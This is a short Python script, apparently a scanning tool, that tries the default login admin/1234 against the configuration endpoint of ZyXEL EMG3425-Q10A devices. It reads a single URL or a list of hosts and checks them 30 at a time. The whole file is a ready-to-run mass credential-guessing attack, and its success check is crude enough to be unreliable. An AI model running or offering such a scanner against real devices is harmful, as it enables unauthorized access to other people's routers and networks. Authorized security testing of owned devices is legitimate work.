import random
from multiprocessing.dummy import Pool
import requests, argparse

ASCII_ART = [
    r"""
    /\_/\  
   ( o.o ) 
    > ^ <
    """,
    r"""
    /\/\/\
   ( •_•) 
   / >   \ 
    """
]


def main():
    print("\n" + random.choice(ASCII_ART) + "\n")
    parse = argparse.ArgumentParser(description="众勤通信设备贸易（上海）有限公司ZyXEL-EMG3425-Q10A弱口令检测工具")
    parse.add_argument("-u", dest="url", type=str, help="URL")
    parse.add_argument("-f", dest="file", type=str, help="FILE")
    args = parse.parse_args()

    urls = []
    if args.url:
        if 'http://' in args.url:
            urls.append(args.url)
        else:
            urls.append(f"http://{args.url}")
    elif args.file:
        try:
            with open(args.file, 'r+') as f:
                for domain in f:
                    domain = domain.strip()
                    if 'http://' in domain:
                        urls.append(domain)
                    else:
                        urls.append(f"http://{domain}")
        except FileNotFoundError as e:
            print(e)

    pool = Pool(30)
    pool.map(check, urls)

def check(domain):

    data = {
        'language_choice': 'en',
        'username': 'admin',
        'password': '1234',
        'time_choice': 'GMT-0'
    }

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': domain.split('//')[-1].split('/')[0]
    }

    try:
        # 发送POST请求
        response = requests.post(
            f"{domain}/cgi-bin/luci/expert/configuration",
            data=data,
            headers=headers,
            verify=False,
            allow_redirects=False
        )

        # 分析响应
        if response.status_code == 200 and "Content-Type" in response.text:
            print(f"[*]存在漏洞：{domain}")
        else:
            print(f"[-]不存在漏洞{domain}")

    except Exception as e:
        print(f"请求异常：{domain}")


if __name__ == '__main__':
    main()